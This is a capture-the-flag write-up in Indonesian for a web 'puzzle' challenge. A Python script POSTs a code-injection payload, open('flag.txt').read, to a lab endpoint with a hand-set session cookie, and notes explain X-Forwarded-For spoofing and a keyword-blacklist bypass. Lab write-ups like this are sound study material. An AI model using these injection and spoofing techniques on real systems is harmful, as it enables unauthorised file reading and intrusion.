## Manual Via burp

## Script
import requests

url = "http://172.17.0.1:1778/puzzle"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "session=eyJjYW5fc29sdmVfcHV6emxlIjp0cnVlfQ.Zs_Qhg._iluX_9mydxmOAzRKY5bwVho4nw"
}

data = {
    "solution": "open('flag.txt').read"
}

response = requests.post(url, headers=headers, data=data)

print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")

## Penjelasan
ini cukup simple, X-Forwarded-For agar ke IP 182.168.1.1, kemudian untuk dapat flag ada di route /puzzle dan dengan method POST, jadi kita ubah kesana ( bisa dengan burp ), kemudian kita baca apa saja yg di blaclist dari sana kita bisa dengan open dan read karena tidak di blaclist.
Jangan lupa method request nya content type nya harus application/x-www-form-urlencoded agar bisa dapat data